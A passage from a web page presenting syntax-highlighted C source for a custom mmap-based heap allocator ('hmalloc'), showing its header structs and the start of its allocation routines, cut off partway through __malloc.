</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span><span class=o>*</span> <span class=n>prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>list_head</span>  <span class=n>buckets</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Offset of the available alloc inside the bucket */</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span>  <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* How many allocs are freed */</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span>   <span class=n>freelist_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span>   <span class=n>freelist</span><span class=p>[</span><span class=n>MAX_ALLOCS</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span>     <span class=n>allocs</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/* Single allocations just contain the size of the alloc as metadata */</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>alloc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint16_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span>   <span class=n>user</span><span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>__attribute__</span><span class=p>((</span><span class=n>packed</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span> <span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>__hmalloc_init</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>__malloc</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>size_t</span> <span class=nf>__round_up_size</span><span class=p>(</span><span class=n>size_t</span> <span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>size_t</span> <span class=nf>__bucket_max_allocations</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=nf>__get_bucket</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=nf>__get_bucket_from_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>target_alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>,</span> <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>__fastpath_new_bucket_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>bucket</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>__is_freelist_available</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__dump_bucket</span><span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__dump_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#endif </span><span class=c1>// HMALLOC_H
</span></span></span></code></pre></td></tr></table></div></div><p><code>hmalloc.c</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;hmalloc.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm> * TODO: Single buckets are never unmmaped
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>**</span> <span class=n>bucket_master_ctrl</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>time_t</span> <span class=n>freelist_quarantine_time</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>size_t</span> <span class=nf>__round_up_size</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>power</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span><span class=p>(</span><span class=n>power</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>power</span><span class=o>*=</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>power</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__dump_bucket</span><span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>b</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG]</span><span class=se>\t</span><span class=s>struct bucket {</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>next: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>prev: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>buckets</span><span class=p>.</span><span class=n>prev</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>offset: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>freelist_count: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>freelist_count</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>freelist[%d]: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>freelist</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>allocs: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>allocs</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>}</span><span class=se>\n</span><span class=s>[/DEBUG]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>__dump_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;[DEBUG]</span><span class=se>\t</span><span class=s>struct alloc {</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>size: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t\t</span><span class=s>user: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>}</span><span class=se>\n</span><span class=s>[/DEBUG]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>__hmalloc_init</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=n>bucket_master_ctrl</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>PAGE_SZ</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANON</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>bucket_master_ctrl</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>perror</span><span class=p>(</span><span class=s>&#34;mmap&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>//DEBUG_PRINT(&#34;[DEBUG] HMALLOC initialized with bucket_master_ctrl = %p\n&#34;, bucket_master_ctrl);
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>memset</span><span class=p>(</span><span class=n>bucket_master_ctrl</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>PAGE_SZ</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=nf>__init_bucket</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;Initializing small bucket with %d pages</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SMALL_BUCKET_PAGES</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>bucket</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>PAGE_SZ</span> <span class=o>*</span> <span class=n>SMALL_BUCKET_PAGES</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANON</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>bucket</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=n>PAGE_SZ</span> <span class=o>*</span> <span class=n>SMALL_BUCKET_PAGES</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>size_t</span> <span class=nf>__bucket_max_allocations</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>((</span><span class=n>PAGE_SZ</span> <span class=o>*</span> <span class=n>SMALL_BUCKET_PAGES</span><span class=p>)</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=p>))</span> <span class=o>/</span> <span class=n>alloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=nf>__get_bucket</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>off_t</span> <span class=n>off</span> <span class=o>=</span> <span class=n>alloc_size</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=kt>void</span><span class=o>**</span><span class=p>)((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>bucket_master_ctrl</span> <span class=o>+</span> <span class=n>off</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=nf>__get_bucket_from_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>target_alloc</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=n>target_alloc</span> <span class=o>&amp;</span> <span class=n>SMALL_BUCKET_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__update_master_ctrl_bucket</span><span class=p>(</span><span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>,</span> <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>bck</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>off_t</span> <span class=n>off</span> <span class=o>=</span> <span class=n>alloc_size</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=kt>void</span><span class=o>**</span><span class=p>)</span> <span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span> <span class=n>bucket_master_ctrl</span> <span class=o>+</span> <span class=n>off</span><span class=p>)</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>__fastpath_new_bucket_alloc</span><span class=p>(</span><span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>b</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>alloc_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=c1>// return the pointer to the first allocation of a newly allocated bucket
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>alloc</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span><span class=p>)</span> <span class=n>b</span><span class=o>-&gt;</span><span class=n>allocs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>alloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>b</span><span class=o>-&gt;</span><span class=n>offset</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>alloc</span><span class=o>-&gt;</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>__is_freelist_available</span><span class=p>(){</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef FREELIST_QUARANTINE
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>if</span><span class=p>((</span><span class=n>time</span><span class=p>(</span><span class=nb>NULL</span><span class=p>)</span> <span class=o>-</span> <span class=n>freelist_quarantine_time</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>FREELIST_QUARANTINE_WAIT</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>  <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size_t</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span><span class=o>*</span> <span class=n>alloc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>bucket_master_ctrl</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>__hmalloc_init</span><span class=p>())</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>alloc</span> <span class=o>=</span> <span class=n>__malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;malloc(%zu) = %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>alloc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>alloc</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span><span class=o>*</span> <span class=nf>__malloc</span><span class=p>(</span><span class=n>size_t</span> <span class=n>input_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span>  <span class=n>alloc_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>off_t</span>   <span class=n>bucket_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>off_t</span>   <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>current_bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>old_current_bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>bucket</span><span class=o>*</span> <span class=n>linked_bucket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>alloc</span><span class=o>*</span> <span class=n>alloc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>freelist_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>size_t</span>  <span class=n>bucket_max_allocs</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* Size validation */</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>input_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>DEBUG_PRINT</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>+++++++++ MALLOC +++++++++</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
